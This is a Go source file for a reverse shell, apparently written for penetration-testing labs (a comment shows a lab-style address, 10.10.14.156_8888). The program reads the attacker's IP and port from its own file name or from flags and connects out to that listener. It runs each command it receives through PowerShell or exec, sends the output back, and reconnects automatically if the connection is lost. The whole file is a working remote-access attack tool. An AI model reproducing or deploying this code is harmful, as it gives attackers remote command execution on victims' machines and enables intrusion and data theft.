package main

import (
	"bufio"
	"flag"
	"fmt"
	"net"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)

var (
	address string
)

func main() {
	filename := filepath.Base(os.Args[0]) //10.10.14.156_8888
	if strings.Contains(filename, "_") {
		rawAddress := strings.TrimRight(filename, ".exe")
		ipPort := strings.Split(rawAddress, "_")
		port, _ := strconv.Atoi(ipPort[1])
		address = fmt.Sprintf("%s:%d", ipPort[0], port)
	} else {
		ipaddr := flag.String("a", "127.0.0.1", "ip")
		port := flag.Int("p", 9999, "port")
		flag.Parse()
		address = fmt.Sprintf("%s:%d", *ipaddr, *port)
	}
	fmt.Println("[-] Trying to connect to " + address)
	connect()
}

func connect() {
	//Connect to the listener
	c, err := net.Dial("tcp", address)
	if err != nil {
		if c != nil {
			c.Close()
		}
		time.Sleep(time.Second)
		connect()
	}
	shell(c)
}
func shell(c net.Conn) {
	var res *exec.Cmd
	fmt.Println("[+] Connected... :)")
	go alive(c)
	r := bufio.NewReader(c)
	for {
		//Print path and > on the shell
		path, _ := os.Getwd()
		c.Write([]byte(path))
		c.Write([]byte(">"))

		//Read remote input
		cmd, err := r.ReadString('\n')
		if nil != err {
			c.Close()
			fmt.Println("[-] Closed... :(")
			connect()
			return
		}
		//Remove the "\n"
		cmd = strings.TrimSuffix(cmd, "\n")
		args := strings.Split(cmd, " ")
		//Get the home dir
		usr, _ := user.Current()
		//Custom commands
		switch args[0] {
		case "cd":
			//Go home directory if command is "cd"
			if len(args) == 1 {
				os.Chdir(usr.HomeDir)
			} else {
				os.Chdir(args[1])
			}
		case "exit":
			//Exit terminal
			c.Close()
			os.Exit(0)
		case "help":
			c.Write([]byte("exit : exit terminal"))
		default:
			if runtime.GOOS == "windows" {
				res = exec.Command("powershell", "/C", cmd)
			} else {
				res = exec.Command(cmd)
			}
			//Read and print output
			out, _ := res.CombinedOutput()
			c.Write(out)
		}
	}
}
func alive(c net.Conn) {
	//checks if the connection is still alive
	one := make([]byte, 1)
	for {
		_, err := c.Write(one)
		if err != nil {
			fmt.Println("[-] Lost connection")
			fmt.Println("[*] Trying to reconnect")
			connect()
			return
		}
		time.Sleep(time.Second)
	}
}
